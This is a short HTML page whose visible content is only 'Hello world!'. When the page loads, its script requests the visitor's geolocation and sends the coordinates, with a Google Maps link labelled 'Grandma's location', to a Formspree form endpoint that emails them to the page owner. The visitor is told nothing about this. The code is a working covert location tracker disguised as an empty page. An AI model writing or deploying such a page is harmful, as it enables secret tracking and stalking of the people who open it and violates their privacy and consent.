<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Location via Email</title>
    <script>
        // Function to check the permission status and send location
        function checkLocationPermission() {
            // Check if geolocation permission has already been granted
            if ("permissions" in navigator) {
                navigator.permissions.query({ name: "geolocation" }).then((result) => {
                    if (result.state === "granted") {
                        // If permission is granted, fetch the location
                        sendLocation();
                    } else if (result.state === "prompt") {
                        // If permission is in prompt state, ask for location
                        sendLocation();
                    } else {
                        alert("Location access denied");
                    }
                });
            } else {
                alert("Permissions API is not supported in this browser.");
            }
        }

        // Function to send the location
        function sendLocation() {
            if ("geolocation" in navigator) {
                // Try to fetch the location immediately
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const { latitude, longitude } = position.coords;

                        const emailData = new FormData();
                        emailData.append('latitude', latitude);
                        emailData.append('longitude', longitude);
                        emailData.append('message', `Grandma's location:\nLatitude: ${latitude}, Longitude: ${longitude}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);

                        // Send the email via Formspree API
                        fetch('https://formspree.io/f/xjkvdbwg', {  // Replace with your Formspree form ID
                            method: 'POST',
                            body: emailData
                        })
                        .then(response => response.json())
                        .then(() => console.log('Location sent successfully!'))
                        .catch((error) => {
                            console.error('Error:', error);
                            alert('Failed to send the email.');
                        });
                    },
                    (error) => {
                        alert("Error fetching location: " + error.message);
                    }
                );
            } else {
                alert("Geolocation is not supported by your browser.");
            }
        }

        // Automatically check permissions and send location when the page loads
        window.onload = checkLocationPermission;
    </script>
</head>
<body>
    <h1>Hello world!</h1>
</body>
</html>
